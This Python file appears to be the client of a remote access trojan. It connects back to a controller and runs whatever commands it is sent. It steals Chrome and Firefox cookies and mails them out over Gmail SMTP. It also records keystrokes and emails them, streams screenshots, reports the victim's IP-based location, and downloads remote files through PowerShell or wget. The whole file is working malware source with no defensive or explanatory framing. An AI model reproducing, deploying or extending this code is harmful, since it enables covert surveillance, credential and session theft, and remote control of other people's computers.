import socket
import os
import subprocess
import pyautogui
import  platform
import browser_cookie3
import ipapi
import smtplib
import pynput.keyboard as Keyboard
from PIL import ImageGrab
import io

host  = "127.0.0.1"
port  =  5

email=""
password=""
boom=[]

def on_press(key):
    # Callback function whenever a key is pressed
    try:
        key = str(key).replace("'", "")
        if(key=="Key.esc"):
            print ("")
        else:
            boom.append(key)
            # print (key)
    except AttributeError:
        print ("")

        # print(f'Special Key {key} pressed!')


def on_release(key):
    key = str(key).replace("'", "")
    if key == "~":
        # Stop the listener
        return False
def ChangeImage():
    try:
            while True:
                try:
                    data = connt.recv(1024)
                except:
                    continue
                if(data[:].decode("utf-8") == "stop"):
                    break
                else:
                    img = ImageGrab.grab()
                    img_bytes = io.BytesIO()
                    img.save(img_bytes, format='PNG')
                    connt.send(img_bytes.getvalue())
    except:
        print("")

def sendmail(email, password, email22, message):
    server = smtplib.SMTP(host="smtp.gmail.com", port=587)

    server.starttls()

    server.login(email, password)

    server.sendmail(email, email22, message)
    server.quit()

while True:
    connt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            connt.connect((host, port))
            break
        except:
            pass

    while True:
       try:
           data = connt.recv(1024)
           if data[:2].decode("utf-8") == "cd":
               os.chdir(data[3:].decode("utf-8"))
           elif(data[:].decode("utf-8")=="exit"or data[:].decode("utf-8")=="quit"):
               connt.close()
           elif("cookies-chrome" in data[:].decode("utf-8")):
               cookies = list(browser_cookie3.chrome())
               email2 = str(data[:].decode("utf-8")).replace("cookies-chrome", "")
               try:
                   try:
                       for i in cookies:
                           sendmail(email, password, email2, str(i))
                   except:
                       connt.send(str.encode("error"))
                   connt.send(str.encode("send"))
               except:
                   connt.send(str.encode("can't send"))
           elif ("cookies-firefox" in data[:].decode("utf-8")):
               cookies = list(browser_cookie3.firefox())

               email2=str(data[:].decode("utf-8")).replace("cookies-firefox","")
               try:
                   try:
                       for i in cookies:
                        sendmail(email,password,email2,str(i))
                   except :
                       connt.send(str.encode("error"))
                   connt.send(str.encode("send"))
               except:
                   connt.send(str.encode("can't send"))
           elif ("keylog" in data[:].decode("utf-8")):
               with Keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
                   listener.join()
               # print ("stop")
               km = ""
               for i in boom:
                   km += i
                   km += " "
               email2 = str(data[:].decode("utf-8")).replace("keylog", "")
               try:
                    sendmail(email, password, email2, km)
                    connt.send(str.encode("sended"))
               except:
                   connt.send(str.encode("can't send"))
           elif (data[:].decode("utf-8") == "screensher"):
               try:
                   while True:
                       img = ImageGrab.grab()
                       img_bytes = io.BytesIO()
                       img.save(img_bytes, format='PNG')
                       connt.send(img_bytes.getvalue())
                   # sock.close()
               except:
                   print ("")
                   # print("DISCONNECTED")

           elif (data[:].decode("utf-8") == "ip-info"):
               gi = ipapi.location(ip=None, key=None, field=None)
               d1 = " "
               for key, val in gi.items():
                   a = ('%s : %s' % (key, val))
                   d1 += " " + a
               d1 += " copy the ip and  go to this site to get it on google map "
               d1 += "https://www.ipvoid.com/ip-to-google-maps/"
               connt.send(d1)
               # print(d1)
           elif ("dfile" in data[:].decode("utf-8")):
              if(platform.system()=="Windows"):
                  url=str(data[:].decode("utf-8")).replace("dfile","")
                  print (url)
                  os.system('powershell -command "& { (New-Object Net.WebClient).DownloadFile('+url+' ) }')
              else:
                  url=str(data[:].decode("utf-8")).replace("dfile","")
                  print (url)
                  os.system('wget'+url)
           elif(data[:].decode("utf-8")=="screenshot"):
               fil = ""
               if(platform.system()=="Linux"):
                   fil = "/tmp/screen.png"
               elif(platform.system()=="Windows"):
                   winUser=os.getlogin()
                   fil = "C:\\Users\\"+winUser+"\\AppData\\Local\\Temp\\screen.png"
               else:
                   fil = "screen.png"
               myScreenshot = pyautogui.screenshot()
               myScreenshot.save(fil)
               file = open(fil, 'rb')
               b = file.read()
               connt.send(b)
           elif (data[:].decode("utf-8") == "ls"):
               ty = "ls"
               if (platform.system() == "Linux"):
                   ty = "ls"
               elif (platform.system() == "Windows"):
                   ty = 'powershell.exe -command "ls"'
               commander = subprocess.Popen(ty, shell=False, stdout=subprocess.PIPE,
                                            stderr=subprocess.PIPE, stdin=subprocess.PIPE)
               output = commander.stdout.read() + commander.stderr.read()
               user_out = str(output)
               connt.send(str.encode(user_out))  # str(os.getcwd())
               # print(user_out)
           elif (data[:].decode("utf-8") == "pwd"):
               ty = "pwd"
               if (platform.system() == "Linux"):
                   ty = "pwd"
               elif (platform.system() == "Windows"):
                   ty = 'powershell.exe -command "pwd"'
               commander = subprocess.Popen(ty, shell=False, stdout=subprocess.PIPE,
                                            stderr=subprocess.PIPE, stdin=subprocess.PIPE)
               output = commander.stdout.read() + commander.stderr.read()
               user_out = str(output)
               connt.send(str.encode(user_out))  # str(os.getcwd())
               # print(user_out)
           elif (data[:].decode("utf-8") == "ps"):
               ty = "ps"
               if (platform.system() == "Linux"):
                   ty = "ps"
               elif (platform.system() == "Windows"):
                   ty = 'powershell.exe -command "ps"'
               commander = subprocess.Popen(ty, shell=False, stdout=subprocess.PIPE,
                                            stderr=subprocess.PIPE, stdin=subprocess.PIPE)
               output = commander.stdout.read() + commander.stderr.read()
               user_out = str(output)
               connt.send(str.encode(user_out))  # str(os.getcwd())
               # print(user_out)
           elif (data[:].decode("utf-8") == "tree"):
               ty = """ls -R | grep ":$" | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/   /' -e 's/-/|/'"""
               if (platform.system() == "Linux"):
                   ty = """ls -R | grep ":$" | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/   /' -e 's/-/|/'"""
               elif (platform.system() == "Windows"):
                   ty = "tree"
               commander = subprocess.Popen(ty, shell=False, stdout=subprocess.PIPE,
                                            stderr=subprocess.PIPE, stdin=subprocess.PIPE)
               output = commander.stdout.read() + commander.stderr.read()
               user_out = str(output)
               connt.send(str.encode(user_out))  # str(os.getcwd())
               # print(user_out)
           elif len(data) > 0:
                    commander = subprocess.Popen(data[:].decode("utf-8"), shell=False, stdout=subprocess.PIPE,
                                            stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    output = commander.stdout.read() + commander.stderr.read()
                    user_out = str(output)
                    connt.send(str.encode(user_out)) #str(os.getcwd())
                    # print(user_out)

       except:
           connt.close()
           break